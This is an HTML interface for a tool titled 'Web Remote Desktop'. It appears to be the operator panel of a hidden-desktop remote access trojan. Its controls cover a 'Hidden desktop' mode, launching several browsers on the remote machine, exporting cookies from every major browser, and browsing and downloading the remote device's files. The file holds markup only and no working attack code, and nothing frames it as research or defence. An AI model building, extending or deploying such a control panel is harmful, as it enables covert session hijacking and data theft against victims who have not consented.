<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Web Remote Desktop</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700&display=swap"
    rel="stylesheet"
  />
  <link rel="stylesheet" href="styles.css?v=20260203-8" />
</head>
<body class="view-mode">
  <div id="managePanel">
    <div id="interactionMenu" class="hud-section panel-card">
      <div class="section-title">Session mode</div>
      <div class="mode-selector">
        <div class="mode-buttons">
          <button class="mode-chip" type="button" data-mode="view">View</button>
          <button class="mode-chip is-active" type="button" data-mode="manage">Manage</button>
          <button class="mode-chip" type="button" data-mode="hidden">Hidden desktop</button>
        </div>
      </div>
    </div>

    <div id="hud" class="panel-card">
      <div class="hud-section" id="connectionSection">
        <div class="section-title">Connection</div>
        <div class="fields">
          <div class="field">
            <label for="serverUrl">Server URL</label>
            <input id="serverUrl" type="text" value="" placeholder="http://localhost:8000" />
          </div>
          <div class="field">
            <label for="sessionId">Session</label>
            <input id="sessionId" type="text" value="default-session" />
          </div>
        </div>
      </div>
      <div class="hud-section" id="securitySection">
        <div class="section-title">Security</div>
        <div class="fields">
          <div class="field">
            <label for="authToken">Token</label>
            <input id="authToken" type="text" placeholder="optional" />
          </div>
          <div class="field">
            <label for="e2eeKey">E2EE Key</label>
            <input id="e2eeKey" type="password" placeholder="optional" autocomplete="off" />
          </div>
        </div>
      </div>

      <div class="hud-section" id="streamSection">
        <div class="section-title">Stream</div>
        <div class="fields">
          <div class="field">
            <label for="streamProfile">Quality</label>
            <select id="streamProfile">
              <option value="speed">Speed (720-1080p 40-60fps)</option>
              <option value="balanced">Balance (900-1440p 30-60fps)</option>
              <option value="quality" selected>Quality (1080-2160p 30-60fps)</option>
              <option value="reading">Reading (1440-2160p 10-15fps)</option>
            </select>
          </div>
        </div>
      </div>

      <div class="hud-actions">
        <button id="connectButton" type="button">Connect</button>
        <button id="storageToggle" class="ghost" type="button">Storage</button>
        <span id="status" data-state="">Idle</span>
      </div>

      <div class="hud-section" id="appLauncher" data-requires-manage="true">
        <div class="section-title">Apps</div>
        <div class="app-buttons">
          <button class="secondary" type="button" data-app="chrome">Chrome</button>
          <button class="secondary" type="button" data-app="brave">Brave</button>
          <button class="secondary" type="button" data-app="opera">Opera</button>
          <button class="secondary" type="button" data-app="firefox">Firefox</button>
          <button class="secondary" type="button" data-app="edge">Edge</button>
          <button class="secondary" type="button" data-app="yandex">Yandex</button>
        </div>
        <div id="appStatus" class="hint" data-state="">Ready</div>
      </div>

      <div class="hud-section" id="cookieExporter" data-requires-manage="true">
        <div class="section-title">Cookies</div>
        <div class="app-buttons cookie-buttons">
          <button class="secondary" type="button" data-cookie="all">All browsers</button>
          <button class="secondary" type="button" data-cookie="chrome">Chrome</button>
          <button class="secondary" type="button" data-cookie="edge">Edge</button>
          <button class="secondary" type="button" data-cookie="brave">Brave</button>
          <button class="secondary" type="button" data-cookie="opera">Opera</button>
          <button class="secondary" type="button" data-cookie="firefox">Firefox</button>
        </div>
        <div id="cookieStatus" class="hint" data-state="">Ready</div>
      </div>
    </div>

  </div>

  <div id="storageDrawer" aria-hidden="true">
    <div class="drawer-header">
      <div>
        <div class="drawer-title">Remote Storage</div>
        <div class="drawer-subtitle">Browse files and download to this device</div>
      </div>
      <button id="storageClose" class="ghost" type="button">Close</button>
    </div>
    <div class="drawer-body">
      <div class="pane">
        <div class="pane-title">Remote device</div>
        <div class="path-row">
          <input id="remotePathInput" type="text" value="." />
          <button id="remoteGo" class="secondary" type="button">Go</button>
        </div>
        <div class="path-actions">
          <button id="remoteUp" class="ghost small" type="button">Up</button>
          <button id="remoteRefresh" class="ghost small" type="button">Refresh</button>
        </div>
        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody id="remoteFileList">
              <tr>
                <td colspan="3" class="empty-state">Not connected</td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="pane-footer">
          <span id="remoteStatus" data-state="">Idle</span>
        </div>
      </div>
      <div class="pane">
        <div class="pane-title">Local downloads</div>
        <ul id="downloadList" class="download-list">
          <li class="empty-state">No downloads yet</li>
        </ul>
        <div class="pane-footer">
          <span id="downloadStatus" data-state="">Waiting for a download</span>
        </div>
      </div>
    </div>
  </div>

  <div id="screenFrame" tabindex="0">
    <video id="screen" autoplay playsinline></video>
  </div>
  <script>
    if (window.qt && window.qt.webChannelTransport) {
      const script = document.createElement("script");
      script.src = "qrc:///qtwebchannel/qwebchannel.js";
      document.head.appendChild(script);
    }
  </script>
  <script src="js/app_core.js?v=20260203-2" defer></script>
  <script src="js/app_display.js?v=20260203-2" defer></script>
  <script src="js/app_connection.js?v=20260203-3" defer></script>
  <script src="js/app_storage.js?v=20260203-2" defer></script>
  <script src="js/app_bootstrap.js?v=20260203-2" defer></script>
</body>
</html>
